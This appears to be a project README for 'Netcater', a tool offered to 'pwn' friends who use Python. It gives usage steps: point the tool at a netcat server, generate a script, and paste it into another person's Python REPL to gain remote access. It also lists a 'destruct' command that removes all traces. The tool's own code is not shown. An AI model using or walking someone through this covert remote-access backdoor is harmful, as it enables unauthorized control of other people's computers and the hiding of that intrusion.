# Netcater

__A small binary to pwn your Python using freinds__

First change `127.0.0.1` in usbsys.d to the address of your server where netcat will
be running.

The just execute: `./python.sh > out.py` and copy and paste the content of `out.py`
into their Python repl.

You should now have remte access, commands:

* `destruct` - Remove all traces and kill the program
* `chat [message]` - Chat with the person on the other side
